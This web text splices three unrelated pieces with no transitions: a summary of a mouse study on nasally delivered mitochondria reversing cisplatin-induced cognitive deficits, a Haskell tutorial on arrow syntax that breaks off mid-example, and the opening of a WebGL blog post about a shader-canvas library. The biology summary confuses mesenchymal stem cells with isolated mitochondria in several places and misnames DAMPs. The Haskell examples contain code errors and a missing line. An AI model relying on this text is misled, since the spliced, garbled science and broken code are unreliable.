<p>Mitochondrial dysfunction, characterized by abnormal morphology, impaired bioenergetics, altered mitochondrial dynamics and mitochondrial DNA mutations, has emerged as an underlying mechanism of several pathologies, including neurodegenerative diseases, cerebral and cardiac ischemia , traumatic brain injury, spinal cord injury, cancer, and chemotherapy-induced cognitive impairment and peripheral neuropathy. Following cerebral ischemia, astrocytes donate their healthy mitochondria to ischemic neurons with dysfunctional mitochondria to maintain adequate mitochondrial function and survival.</p>

<p>Studies in the 1930s already showed that nasally administered bacteria can cross the nasal epithelium within minutes, indicating a paracellular route of entry.</p>

<p><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC7847685/">In a recent study</a>, Jenolyn F. Alexander, Cobi J. Heijnen and colleagues demonstrated that nasal administration of mesenchymal stem cells restores cisplatin-induced cognitive impairment in mice and their data indicated that these mesenchymal stem cells act by repairing neuronal mitochondrial damage. 
<img src="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC7847685/bin/thnov11p3109g001.jpg" alt="enter image description here"></p>

<p>It appeared that autologous mesenchymal stem cells work as well as human mesenchymal stem cells in their mouse model. The concept of mitochondrial administration is also being considered the treatment of Parkinson's disease, cerebral and cardiac ischemia, cancer, diabetic nephropathy and spinal cord injuries  and some clinical trials for evaluating the safety and efficacy of isolated mitochondria based therapies have also recently commenced.</p>

<p>These findings indicate that cisplatin-induced accumulation of mitochondrial p53 is the cause of the damage to brain mitochondria that leads to cognitive deficits in response to treatment with this chemotherapeutic. The authors recently showed that astrocytes donate their healthy mitochondria and rescue primary cortical neurons damaged by cisplatin in vitro.</p>

<p>Based on their above-mentioned findings that mitochondrial deficits underlie cisplatin-induced neuronal damage and cognitive deficits, and that healthy mitochondria can be taken up by damaged neurons, the scientists hypothesized that isolated mitochondria from healthy mesenchymal stem cells can be used to resolve cisplatin-induced cognitive deficits and the associated structural damage. This would provide an advantage from the perspective of safety because the scientists do not need donation of allogeneic intact cells.</p>

<p>Mice were intraperitoneally injected with cisplatin at 2.3 mg/kg for 5 consecutive days, followed by 5 days of rest and another 5 days of cisplatin injection. The two administrations of mitochondria on mice delivered nasally, completely restored within two weeks mice's executive functioning, spatial recognition and working memory previously impaired by cisplatin treatment. The entry of mesenchymal stem cells into the brain is facilitated by pretreatment of the nasal cavity with hyaluronidase. The scientists maintained the mitochondria in calcium-free mitochondrial respiration buffer until ready for nasal delivery when they were transferred to calcium-free PBS.</p>

<p>Within 30 min of nasal administration, the mitochondria were detectable in the meninges where they were predominantly internalized by macrophages. Within this 30 min, the mitochondria also arrived at the ventricles and choroid plexus, gaining access to the brain.</p>

<p>3 h after delivery, mitochondria were found distributed along the rostral migratory stream where they were internalized by GFAP+ cells. By this time the nasally administered mitochondria also reached the hippocampus. Evidently, these mitochondria that had entered the meninges and brain completely restored the cisplatin-induced white matter damage in the cingulate cortex, synaptic loss in the hippocampus, and the compromised synaptosome membrane integrity and structural mitochondrial defects in synaptosomes as observed 35 days after the second mitochondrial donation.</p>

<p>The scientists used mitochondria isolated from human mesenchymal stem cells in their mouse model for the primary purpose of being able to trace the administered mitochondria with a human-specific mitochondrial antibody.</p>

<p>One topic of concern usually raised with the administration of isolated mitochondria is the possibility that they may function as damage-associated molecular proteins (DAMPs) which could lead to neuroinflammation. However, the scientists did not see activation of inflammatory pathways in the hippocampal transcriptome using human mitochondria. Mitochondria lack many surface antigens including HLA-Class 1 antigens thereby exhibiting lower immunogenicity than mesenchymal stem cells. This is one advantage favoring the clinical translation of allogeneic donation of mitochondria over mesenchymal stem cells.</p>

<p>An important benefit of their approach is the nasal route of delivery. In case of central nervous system (CNS)-targeted delivery of therapeutics, intracranial administration poses serious risk of injury. Intravenous administration has the disadvantage that it may lead to accumulation in the lung and liver requiring high doses which may generate inflammatory reactions or other adverse effects. Systemic administration of therapeutics intended to reach the brain are also obstructed by the blood-brain and blood-cerebrospinal fluid (CSF) barriers. In contrast, the nasal route of delivery is simple, non-invasive and facilitates the delivery of therapeutics to the brain thereby reducing the amount of mitochondria required.</p>

<p>Questions are raised on the ability of isolated mitochondria to survive in high extracellular calcium levels upon administration and to generate sufficient energy to enter cells and continue to function after cellular uptake. Upon internalization, mitochondrial donation enhanced the bioenergetics of the damaged cells for at least 21 days.</p>

<p>It is still unknown how donated mitochondria repair damaged neuronal cells. Interactions between mitochondrial and nuclear genes are vital for fundamental cellular processes such as respiration, transcription and translation. The authors observed that the internalized mitochondria, in many instances were localized close to the nucleus (perinuclear), as if communicating with them. In the literature it has been suggested that donated mitochondria can fuse with mitochondria of damaged recipient cells and thereby repair the bioenergetic machinery or replenish mitochondrial DNA in the acceptor cell.</p>

<p>Although this might be true, it remains difficult to accept that the few mesenchymal stem cells-derived mitochondria can restore cellular respiration by physical fusion to the many acceptor cell mitochondria. It is more likely that the donated mitochondria activate a transcriptional program leading to enhanced Nrf2 signaling and subsequent recovery of host mitochondrial function by a host of antioxidants.</p>

<p>Their findings elucidate the therapeutic effects of nasally delivered mitochondria to resolve unmet needs in the treatment of cancer survivors with neurotoxicities and highlights its potential significance for clinical translation. It also provides promise for treatment of a range of cognitive and neuronal deficits warranting further investigation in large animal models.</p>

<p>A good archer is not known by his arrows but his aim</p>
<p>Thomas Fuller</p>
</div>
<p>Don’t know about you, folks, but I had a hard time remembering all the Haskell arrows that you can bump into in all different situations. For example, I guess I will never be able to use <code>ViewPatterns</code> correctly on the first attempt. For me, the digest of every use case of each arrow in Haskell sounds like a handy thing to have, at least this information will be structured somewhere, so here we go.</p>
<p>Each section of this post covers a specific arrow application, explains when and how it is used and gives examples. Some not that popular usages of the arrow syntax are mentioned in this writing too. So, if you are excited, let’s get started!</p>
<figure>
<img src="https://kowainik.github.io/images/posts/arrows/arrows-blue-knight.jpg" alt="Arrows Blue Knight">
</figure>
<h2 id="section">-&gt;<a href="#section">🔗</a></h2>
<p>The most frequently used arrow in Haskell – right-directed arrow <code>-&gt;</code> – is the one we are going to talk about first and foremost.</p>
<h3 id="types">Types<a href="#types">🔗</a></h3>
<p><code>-&gt;</code> is used in the type signatures to show the relation of types in functions. When just starting learning Haskell, we can think of this arrow as an indicator in the type. But later, we can figure out, that in reality, <code>-&gt;</code> is the built-in data type specified in the <code>GHC.Prim</code> module:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>infixr</span> <span>-</span><span>1</span> <span>-&gt;</span></span>
<span id="cb1-2"><span>data</span> (<span>-&gt;</span>) a b</span></code></pre></div>
<p>The arrow type operator is usually used in the infix form. It shows the direction from input to output type of functions.</p>
<p>For instance, we say that the standard <code>length</code> function takes a list and returns a single integer – the list’s size. With the arrow, it is written in the type like this:</p>

<p>We can use function type when defining a new data type:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>newtype</span> <span>ReaderT</span> r m a <span>=</span> <span>ReaderT</span></span>
<span id="cb3-2">    {<span> runReaderT ::</span> r <span>-&gt;</span> m a</span>
<span id="cb3-3">    }</span></code></pre></div>
<p>Another example of where you can use <code>-&gt;</code> as a type operator is <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/gadt.html">GADT</a>:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>data</span> <span>Expression</span> <span>where</span></span>
<span id="cb4-2">    <span>Literal</span><span> ::</span> <span>String</span> <span>-&gt;</span> <span>Expression</span></span>
<span id="cb4-3">    <span>Const</span><span> ::</span> <span>Int</span> <span>-&gt;</span> <span>Expression</span></span>
<span id="cb4-4">    <span>BinOperation</span><span> ::</span> <span>BinOp</span> <span>-&gt;</span> <span>Expression</span> <span>-&gt;</span> <span>Expression</span></span>
<span id="cb4-5">    <span>...</span></span></code></pre></div>
<h3 id="kinds">Kinds<a href="#kinds">🔗</a></h3>
<p>Like type signatures for functions and data types, we also use <code>-&gt;</code> to specify the kinds of the types (aka types of the types).</p>
<p>With the <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/kind_signatures.html#extension-KindSignatures">KindSignatures</a> extensions, we can specify the kind for the type variables:</p>
<div id="cb5"><pre><code><span id="cb5-1"><span>{-# LANGUAGE KindSignatures #-}</span></span>
<span id="cb5-2"></span>
<span id="cb5-3"><span>data</span> <span>IntBox</span> (<span>f ::</span> <span>Type</span> <span>-&gt;</span> <span>Type</span>) <span>=</span> <span>IntBox</span> (f <span>Int</span>)</span></code></pre></div>
<p>With the relatively new GHC extension – <a href="https://downloads.haskell.org/ghc/latest/docs/html/users_guide/exts/poly_kinds.html#extension-StandaloneKindSignatures">StandaloneKindSignatures</a>, which was added in GHC-8.10, we can specify the <strong>kind</strong> of the type similar to the way we do it for functions’ types:</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>type</span> <span>Pair</span><span> ::</span> <span>Type</span> <span>-&gt;</span> <span>Type</span></span>
<span id="cb6-2"><span>data</span> <span>Pair</span> a <span>=</span> <span>Pair</span> a a</span></code></pre></div>
<p>Right-directed arrow is also used in the <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/type_families.html">type families</a> declarations:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>type</span> <span>family</span> <span>AllHave</span> (<span>f ::</span> k <span>-&gt;</span> <span>Constraint</span>) (<span>xs ::</span> [k])<span> ::</span> <span>Constraint</span> <span>where</span></span>
<span id="cb7-2">    <span>AllHave</span> _ '[]       <span>=</span> ()</span>
<span id="cb7-3">    <span>AllHave</span> f (x '<span>:</span> xs) <span>=</span> (f x, <span>AllHave</span> f xs)</span></code></pre></div>
<h3 id="lambda-function">Lambda function<a href="#lambda-function">🔗</a></h3>
<p>The syntax for lambda functions in Haskell uses the right arrow <code>-&gt;</code> but on the term-level and not type-level as in the previous use-case. The general scheme is the following:</p>
<pre><code>\variables with spaces (or patterns in parenthesis) -&gt; action with variables</code></pre>
<p>Here are a few examples:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>doubleList ::</span> [<span>Int</span>] <span>-&gt;</span> [<span>Int</span>]</span>
<span id="cb9-2">doubleList <span>=</span> <span>map</span> (\x <span>-&gt;</span> x <span>*</span> <span>2</span>)</span>
<span id="cb9-3"></span>
<span id="cb9-4">foldl' (\hash el <span>-&gt;</span> HashSet.insert el hash) <span>mempty</span></span>
<span id="cb9-5"></span>
<span id="cb9-6"><span>ifM ::</span> <span>Monad</span> m <span>=&gt;</span> m <span>Bool</span> <span>-&gt;</span> m a <span>-&gt;</span> m a <span>-&gt;</span> m a</span>
<span id="cb9-7">ifM p x y <span>=</span> p <span>&gt;&gt;=</span> \b <span>-&gt;</span> <span>if</span> b <span>then</span> x <span>else</span> y</span>
<span id="cb9-8"></span>
<span id="cb9-9"><span>heads ::</span> [<span>NonEmpty</span> a] <span>-&gt;</span> [a]</span>
<span id="cb9-10">heads <span>=</span> <span>map</span> (\(x <span>:|</span> _) <span>-&gt;</span> x)</span></code></pre></div>
<h3 id="cases">Cases<a href="#cases">🔗</a></h3>
<p><strong>Case of</strong></p>
<p>In addition to pattern matching in the function declaration, you can also use the <strong>case-of</strong> expression. The main difference between the case-of and top-level pattern matching is that <code>case</code> uses arrows <code>-&gt;</code> instead of <code>=</code> for branch results.</p>
<div id="cb10"><pre><code><span id="cb10-1"><span>whenJust ::</span> <span>Applicative</span> f <span>=&gt;</span> <span>Maybe</span> a <span>-&gt;</span> (a <span>-&gt;</span> f ()) <span>-&gt;</span> f ()</span>
<span id="cb10-2">whenJust ma f <span>=</span> <span>case</span> ma <span>of</span></span>
<span id="cb10-3">    <span>Just</span> x  <span>-&gt;</span> f x</span>
<span id="cb10-4">    <span>Nothing</span> <span>-&gt;</span> <span>pure</span> ()</span></code></pre></div>
<p><strong>Lambda case</strong></p>
<p>Similar to the <em>case-of</em> expression, <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/lambda_case.html#extension-LambdaCase"><strong>lambda case</strong></a> is used to reduce syntax noise when using the case construction on the last argument in lambda functions.</p>
<p>The most common case is to use it on the last input argument in the functions:</p>
<div id="cb11"><pre><code><span id="cb11-1"><span>isEmpty ::</span> [a] <span>-&gt;</span> <span>Bool</span></span>
<span id="cb11-2">isEmpty <span>=</span> \<span>case</span></span>
<span id="cb11-3">    [] <span>-&gt;</span> <span>True</span></span>
<span id="cb11-4">    _  <span>-&gt;</span> <span>False</span></span></code></pre></div>
<p><strong>Case guards</strong></p>
<p>Just like <em>guards</em> in normal functions, you can use guards with cases as well in the same manner, but keeping the syntax of the <em>case-of</em> with <code>-&gt;</code>:</p>
<div id="cb12"><pre><code><span id="cb12-1"><span>maybeAddEven ::</span> <span>Maybe</span> <span>Int</span> <span>-&gt;</span> <span>Maybe</span> <span>Int</span> <span>-&gt;</span> <span>Maybe</span> <span>Int</span></span>
<span id="cb12-2">maybeAddEven ma mb <span>=</span> <span>case</span> (ma, mb) <span>of</span></span>
<span id="cb12-3">    (<span>Just</span> a, <span>Just</span> b)</span>
<span id="cb12-4">        <span>|</span> <span>even</span> a <span>&amp;&amp;</span> <span>even</span> b <span>-&gt;</span> <span>Just</span> a <span>+</span> b</span>
<span id="cb12-5">        <span>|</span> <span>otherwise</span> <span>-&gt;</span> <span>Nothing</span></span>
<span id="cb12-6">    (_, _) <span>-&gt;</span> <span>Nothing</span></span></code></pre></div>
<p><strong>Lambda Case* </strong></p>
<p>Additionally, since GHC 9.0.1, combining <code>LambdaCase</code> with <code>Arrows</code> allows the <code>\case</code> syntax to be used as a command in the <code>proc</code> notation:</p>
<div id="cb13"><pre><code><span id="cb13-1">proc x <span>-&gt;</span> (f <span>-&lt;</span> x) <span>`catchA`</span> \<span>case</span></span>
<span id="cb13-2">    p1 <span>-&gt;</span> cmd1</span>
<span id="cb13-3">    <span>...</span></span>
<span id="cb13-4">    pN <span>-&gt;</span> cmdN</span></code></pre></div>
<h3 id="view-patterns">View Patterns<a href="#view-patterns">🔗</a></h3>
<p><a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/view_patterns.html?highlight=viewpatterns#extension-ViewPatterns"><code>-XViewPatterns</code></a> is a handy extension that allows writing function application directly in the arguments specification. And, as you can guess, the <code>-&gt;</code> is part of its syntax too. First, you need to specify the function you want to apply and then, after the arrow, the variable that you can use later on in the function body. E.g.</p>
<div id="cb14"><pre><code><span id="cb14-1"><span>mkUser ::</span> <span>Text</span> <span>-&gt;</span> <span>Text</span> <span>-&gt;</span> <span>User</span></span>
<span id="cb14-2">mkUser (Text.toLower <span>-&gt;</span> nickname) (Text.toLower <span>-&gt;</span> name) <span>=</span> <span>User</span></span>
<span id="cb14-3">    { userNickname <span>=</span> nickname</span>
<span id="cb14-4">    , userName <span>=</span> name</span>
<span id="cb14-5">    }</span></code></pre></div>
<p>You can also use <code>ViewPatterns</code> with the concrete pattern, not the variable:</p>
<div id="cb15"><pre><code><span id="cb15-1"><span>startWithA ::</span> <span>String</span> <span>-&gt;</span> <span>Bool</span></span>
<span id="cb15-2">startWithA (<span>map</span> <span>toLower</span> <span>-&gt;</span> <span>'a'</span><span>:</span>_) <span>=</span> <span>True</span></span>
<span id="cb15-3">startWithA _ <span>=</span> <span>False</span></span></code></pre></div>
<p>Multiple <code>ViewPatterns</code> can be composed in a single pattern:</p>
<div id="cb16"><pre><code><span id="cb16-1"><span>maybeEven ::</span> <span>Maybe</span> <span>Int</span> <span>-&gt;</span> <span>String</span></span>
<span id="cb16-2">maybeEven (fromMaybe <span>0</span> <span>-&gt;</span> <span>even</span> <span>-&gt;</span> isEven) <span>=</span></span>
<span id="cb16-3">    <span>if</span> isEven</span>
<span id="cb16-4">    <span>then</span> <span>"Even number"</span></span>
<span id="cb16-5">    <span>else</span> <span>"Other"</span></span></code></pre></div>
<blockquote>
<p>The above is equivalent to the usage of ordinary function composition and a single view pattern:</p>
<div id="cb17"><pre><code><span id="cb17-1">maybeEven (<span>even</span> <span>.</span> fromMaybe <span>0</span> <span>-&gt;</span> isEven)</span></code></pre></div>
</blockquote>
<div id="cb18"><pre><code><span id="cb18-1"><span>&gt;</span> maybeEven (<span>Just</span> <span>2</span>)</span>
<span id="cb18-2"><span>"Even number"</span></span>
<span id="cb18-3"><span>&gt;</span> maybeEven (<span>Just</span> <span>15</span>)</span>
<span id="cb18-4"><span>"Other"</span></span>
<span id="cb18-5"><span>&gt;</span> maybeEven <span>Nothing</span></span>
<span id="cb18-6"><span>"Other"</span></span></code></pre></div>
<h3 id="multi-way-if">Multi-Way If<a href="#multi-way-if">🔗</a></h3>
<p>The <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/multiway_if.html#extension-MultiWayIf"><code>MultiWayIf</code></a> extension allows writing <code>if-then-else</code> constructions with <em>guards</em> to check more conditions on the same level, and it also uses the right-directed arrow (-&gt;). Check this one out:</p>
<div id="cb19"><pre><code><span id="cb19-1"><span>choose ::</span> [<span>String</span>] <span>-&gt;</span> <span>IO</span> ()</span>
<span id="cb19-2">choose allowedStrs <span>=</span> <span>do</span></span>
<span id="cb19-3">    input <span>&lt;-</span> <span>getLine</span></span>
<span id="cb19-4">    <span>if</span> <span>|</span> trim input <span>==</span> <span>""</span> <span>-&gt;</span></span>
<span id="cb19-5">           <span>putStrLn</span> <span>"Empty input"</span> <span>&gt;&gt;</span> choose allowedStrs</span>
<span id="cb19-6">       <span>|</span> <span>map</span> <span>toLower</span> input <span>`elem`</span> allowedStrs <span>-&gt;</span></span>

<span id="cb19-8">       <span>|</span> <span>otherwise</span> <span>-&gt;</span></span>
<span id="cb19-9">           <span>putStrLn</span> <span>"Choose wisely"</span> <span>&gt;&gt;</span> choose allowedStrs</span></code></pre></div>
<h3 id="linear-types">Linear types*<a href="#linear-types">🔗</a></h3>
<p>The brand new feature introduced in Haskell is <a href="https://ghc.gitlab.haskell.org/ghc/doc/users_guide/exts/linear_types.html"><strong>linear types</strong></a>. It only appeared in GHC-9.0 and is not yet that widespread, but it is nice to know that the arrow with the special syntax can represent linear types. The syntax is using <code>%m -&gt;</code> to specify the “linearity” of the function.</p>
<p>See the example of the <code>uncons</code> function, that consumes the input list only once (hence <code>%1</code>):</p>
<div id="cb20"><pre><code><span id="cb20-1"><span>uncons ::</span> [a] <span>%</span><span>1</span> <span>-&gt;</span> <span>Maybe</span> (a, [a])</span>
<span id="cb20-2">uncons [] <span>=</span> <span>Nothing</span></span>
<span id="cb20-3">uncons (x<span>:</span>xs) <span>=</span> <span>Just</span> (x, xs)</span></code></pre></div>
<h2 id="section-1">&lt;-<a href="#section-1">🔗</a></h2>
<p>Now, let’s see where the opposite-direction arrow <code>&lt;-</code> is used. It is also quite popular and has different use-cases, which is good to distinguish in order to understand and control your code better.</p>
<h3 id="do">Do<a href="#do">🔗</a></h3>
<p>One of the main syntactic Haskell features is <strong>“do” notation</strong>. Do-notation is an alternative for building up monadic computations, using a pseudo-imperative code writing style with the named variables. In reality, do-notation is the syntax-sugar for the binding that uses the left arrow <code>&lt;-</code> operator to assign the result of binding into the variable.</p>
<p>There are a few types of do-notations. We are going to check out each of them separately here.</p>
<p><strong>Traditional Do-notation</strong></p>
<p>Any instance of the <code>Monad</code> class can be used in a traditional do-block in Haskell without any additional extension whatsoever.</p>
<p>The most conventional usage of do-notation is with the <code>IO</code> Monad:</p>
<div id="cb21"><pre><code><span id="cb21-1"><span>main ::</span> <span>IO</span> ()</span>
<span id="cb21-2">main <span>=</span> <span>do</span></span>
<span id="cb21-3">    input <span>&lt;-</span> <span>getLine</span></span>
<span id="cb21-4">    <span>putStrLn</span> <span>$</span> input <span>&lt;&gt;</span> <span>" is what you wrote."</span></span></code></pre></div>
<p>This is the same as:</p>
<div id="cb22"><pre><code><span id="cb22-1">main <span>=</span> <span>getLine</span> <span>&gt;&gt;=</span> \input <span>-&gt;</span> putStrLin (input <span>&lt;&gt;</span> <span>" is what you wrote."</span>)</span></code></pre></div>
<blockquote>
<p>Note how our new arrow <code>&lt;-</code> translates to the already familiar lambda-arrow <code>-&gt;</code> and the bind (<code>&gt;&gt;=</code>) operator.</p>
</blockquote>
<p>Do-notation could be written with any Monad: <code>Maybe</code>, <code>Either</code>, <code>Reader</code>, <code>State</code>, etc.</p>
<blockquote>
<p>Note: do not confuse <code>&lt;-</code> binding and <code>let =</code> expressions in the do-notation. <code>let =</code> is used for simple variable assignment, when <code>&lt;-</code> is used to assign the “binded” variable.</p>
<div id="cb23"><pre><code><span id="cb23-1"><span>main ::</span> ()</span>
<span id="cb23-2">main <span>=</span> <span>do</span></span>
<span id="cb23-3">    input <span>&lt;-</span> <span>getLine</span></span>
<span id="cb23-4">    <span>let</span> reversedInput <span>=</span> <span>reverse</span> input</span>
<span id="cb23-5">    <span>putStrLn</span> <span>$</span> <span>"Reverse of what you wrote is "</span> <span>&lt;&gt;</span> reversedInput</span></code></pre></div>
</blockquote>
<p><strong>Applicative-do</strong></p>
<p><a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/applicative_do.html">ApplicativeDo</a> is a GHC extension that allows using do-notation with the <code>Applicative</code> representers. Unlike monadic <code>do</code>, this one uses do-notation to syntax sugar <code>&lt;$&gt;</code> and <code>&lt;*&gt;</code> operators of the <code>Applicative</code> typeclass.</p>
<p>Applicative-do is very useful for working with Applicative-based solutions, for example, with <a href="https://hackage.haskell.org/package/optparse-applicative">optparse-applicative</a> – Haskell parsing library:</p>
<div id="cb24"><pre><code><span id="cb24-1"><span>{-# LANGUAGE ApplicativeDo #-}</span></span>
<span id="cb24-2"></span>
<span id="cb24-3"><span>userParser ::</span> <span>Parser</span> <span>User</span></span>
<span id="cb24-4">userParser <span>=</span> <span>do</span></span>
<span id="cb24-5">    userName <span>&lt;-</span> nameParser</span>
<span id="cb24-6">    userAge  <span>&lt;-</span> ageParser</span>
<span id="cb24-7">    <span>pure</span> (<span>User</span> userName userAge)</span></code></pre></div>
<p>The above becomes the syntax sugar for:</p>
<div id="cb25"><pre><code><span id="cb25-1"><span>userParser ::</span> <span>Parser</span> <span>User</span></span>
<span id="cb25-2">userParser <span>=</span> <span>User</span> <span>&lt;$&gt;</span> nameParser <span>&lt;*&gt;</span> ageParser</span></code></pre></div>
<p><strong>Recursive-do</strong></p>
<p><code>RecursiveDo</code> is yet another extension to strengthen do-notation. It allows recursive bindings that won’t work with the ordinary do-notation.</p>
<div id="cb26"><pre><code><span id="cb26-1"><span>{-# LANGUAGE RecursiveDo #-}</span></span>
<span id="cb26-2"></span>
<span id="cb26-3"><span>data</span> <span>Node</span> <span>=</span> <span>Node</span> <span>Int</span> (<span>IORef</span> <span>Node</span>)</span>
<span id="cb26-4"></span>
<span id="cb26-5"><span>mkNode ::</span>  <span>IO</span> (<span>IORef</span> <span>Node</span>)</span>
<span id="cb26-6">mkNode <span>=</span> <span>do</span></span>
<span id="cb26-7">    rec nodeRef <span>&lt;-</span> newIORef (<span>Node</span> <span>0</span> nodeRef)</span>
<span id="cb26-8">    <span>return</span> nodeRef</span></code></pre></div>
<p>Alternatively to the <code>rec</code> keyword for the particular binding, <code>mdo</code> could be used instead of <code>do</code> to use recursive bindings on the whole block where GHC will cleverly apply it optimally.</p>
<p><strong>Qualified-Do</strong></p>
<p>The <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/exts/qualified_do.html?highlight=qualifieddo#extension-QualifiedDo">QualifiedDo</a> extension is the most recent addition to the compiler that became available only with the GHC version 9.0.</p>
<p>The feature allows you to customise the do-notation sugaring rules (you can use the <code>&gt;&gt;=</code> function defined in some modules in the qualified <code>do</code> blocks). You would then be able to specify qualified for each particular case you want to use it with.</p>
<p>For example, if we have a <code>List</code> module that would define binding functions:</p>
<div id="cb27"><pre><code><span id="cb27-1"><span>module</span> <span>List</span> <span>where</span></span>
<span id="cb27-2"></span>
<span id="cb27-3"><span>import</span> <span>Prelude</span> <span>hiding</span> (<span>Monad</span> (..))</span>
<span id="cb27-4"></span>
<span id="cb27-5"><span>(&gt;&gt;=) ::</span> [a] <span>-&gt;</span> (a <span>-&gt;</span> [b]) <span>-&gt;</span> [b]</span>
<span id="cb27-6">(<span>&gt;&gt;=</span>) <span>=</span> <span>flip</span> <span>concatMap</span></span>
<span id="cb27-7"></span>
<span id="cb27-8"><span>(&gt;&gt;) ::</span> a <span>-&gt;</span> [a] <span>-&gt;</span> [a]</span>
<span id="cb27-9">(<span>&gt;&gt;</span>) <span>=</span> (<span>:</span>)</span></code></pre></div>
<p>Then you can use it for the list do-notation:</p>
<div id="cb28"><pre><code><span id="cb28-1"><span>{-# LANGUAGE QualifiedDo #-}</span></span>
<span id="cb28-2"></span>
<span id="cb28-3"><span>import</span> <span>qualified</span> <span>List</span></span>
<span id="cb28-4"></span>
<span id="cb28-5"><span>list ::</span> [<span>String</span>]</span>
<span id="cb28-6">list <span>=</span> List.do</span>
<span id="cb28-7">    num <span>&lt;-</span> [<span>10</span>, <span>42</span>]</span>
<span id="cb28-8">    <span>"Hello"</span></span>
<span id="cb28-9">    <span>"number"</span></span>
<span id="cb28-10">    <span>show</span> num</span>
<span id="cb28-11">    <span>"…</span></span></code></pre></div></div></div></div></div>

		<p>When people think about the WebGL API, they focus on one of the famous libraries
that use it. Typically <a href="https://threejs.org/">"three.js"</a> or
<a href="https://www.babylonjs.com/">"Babylon"</a>. There's barely any motivation
to use the WebGL API directly. But the WebGL API is still just as important to
know as it provides creative ways to place colors in browser pages.</p>
<p>The <a href="https://www.khronos.org/registry/webgl/specs/latest/1.0/#1">WebGL spec</a> even starts by saying:</p>
<p><em>Given the many use cases of 3D graphics, WebGL chooses the approach of providing
flexible primitives that can be applied to any use case. Libraries can provide
an API on top of WebGL that is more tailored to specific areas, thus adding a
convenience layer to WebGL that can accelerate and simplify development. However,
because of its OpenGL ES 2.0 heritage, it should be straightforward for
developers familiar with modern desktop OpenGL or OpenGL ES 2.0 development to
transition to WebGL development.</em></p>
<p>WebGL was made closer to OpenGL ES 2.0 (a C/C++-oriented framework) than closer
to its sibling web APIs.</p>
<p>For a front-end developer, programing directly in WebGL feels like juggling
many unseen global variables while struggling to understand why functions take
those strange byte arguments.</p>
<p><img src="https://hugodaniel.com/images/maskontop.png" alt="Three colored COVID face masks on top of each other"></p>
<h2 id="graphics-frameworks-that-work-on-top-of-graphics-frameworks">Graphics frameworks that work on top of graphics frameworks</h2>
<p>Fortunately, there are a lot of frameworks that simplify our life when dealing
with the WebGL API. The most recent web-trend of these use threejs and tries to
bring back some helpful <a href="https://en.wikipedia.org/wiki/VRML">VRML</a>-like concepts through tags/components. For React,
there is <a href="https://github.com/pmndrs/react-three-fiber">"react-three-fiber"</a>.
For Web Components, the <a href="https://aframe.io/">"a-frame"</a>, and recently
<a href="https://troisjs.github.io/">"troisjs"</a> for Vue, among many others.</p>
<p>These frameworks provide the same sort of standard graphical decomposition.
They use <em>"cameras"</em> pointed into a <em>"scene"</em> of <em>"objects"</em> with <em>"materials"</em>
and <em>"transformations"</em> applied to them.</p>
<h2 id="why-use-webgl-directly">Why use WebGL directly?</h2>
<p>Using the WebGL API directly, at the very least, helps you understand how it
works and consequently how those trendy high-level graphics frameworks get to
deploy their concepts. It is not for the faint of heart. WebGL is a low-level
API that inherits a lot of stuff from OpenGL ES, inheriting a lot from OpenGL,
inheriting a lot from the 90s. Oh, the 90s, the dark ages of API design.</p>
<p>All that taken into consideration, there are some <strong>real</strong> benefits for the
enthusiastic programmer:</p>
<ul>
<li><strong>Learn an abstraction of GPU graphics and primitives:</strong> in WebGL, there are
no <em>"cameras"</em> or even a <em>"scene"</em> with <em>"materials"</em>. Instead, you get to use
<em>"buffers"</em> and <em>"programs"</em>, and <em>"vertex array objects"</em> in <em>"shader"</em> code
written with a specific syntax.</li>
<li><strong>Focus on shaders:</strong> WebGL is all about the code that runs ultra fast in the
GPU, using specific techniques to leverage high-performance parallel runs.</li>
<li><strong>Immediate mode API:</strong> Learning how to use an immediate mode graphics API is
cool to understand how it is biased towards baking things in initialization
to reduce the draw calls that get executed at runtime.</li>
</ul>
<p>If you are willing to go down that rabbit hole, <a href="https://www.khronos.org/webgl/wiki/Getting_Started">start here</a>
and proceed with the excellent <a href="https://webgl2fundamentals.org/">WebGL 2 Fundamentals</a>.</p>
<h2 id="abstract-the-frustration-away">Abstract the frustration away</h2>
<p>With WebGL, even simple things take quite a bit of code. A simple image is
never "simple". It can require pages of code in setup and initialization and a
whole WebGL global state system that needs to be maintained.</p>
<p><img src="https://hugodaniel.com/images/masksontree.png" alt="A tree with COVID masks as leafs"></p>
<p>As a result, 10 years ago, back in the early days of WebGL (which today has
its 10th anniversary!), a few libraries showed up that used a thin abstraction
layer on top of it and tried to deal with the boilerplate JS code.
<a href="https://github.com/evanw/lightgl.js/">lightgl.js</a> is one of these notorious
libs.</p>
<p>Writing and maintaining the WebGL boilerplate can be quite a traumatic
experience for the aspiring front-end developer. There are many formulations
of its concepts that have evolved through these 10 years.</p>
<h2 id="being-declarative-without-losing-the-webgl-domain">Being declarative without losing the WebGL domain</h2>
<p>The new graphics frameworks bring into the declarative space the primitives
that threejs handle in code. They do it subtly by bridging DOM libraries
(React, Vue, or even bare Web Components) and standard high-level graphics
primitives.</p>
<p>HTML tags are excellent in providing sequence and hierarchy in a declarative
way. Their structure is an easy match for scene graphs.
<a href="https://en.wikipedia.org/wiki/VRML">VRML</a> was onto something, and now we know
it.</p>
<p>What if this declarative tag-oriented approach could be used in the WebGL
domain primitives instead of the typical camera/scene graph representation?</p>
<h2 id="meet-shader-canvas">Meet <a href="https://hugodaniel.com/projects/shader-canvas"><code>&lt;shader-canvas&gt;</code></a></h2>
<p>In my life quest of making different drawing tools and apps, I find myself
leaning more towards using buffers and GLSL programs than with "cameras" and
nodes.</p>
<p>I am not a graphics programmer by trade and tend to start thinking about
shader code and how data will flow with it before any other graphical
abstraction. This was a strong motivation to create a low-level WebGL
abstraction that could be easily visible and declared with tags.</p>
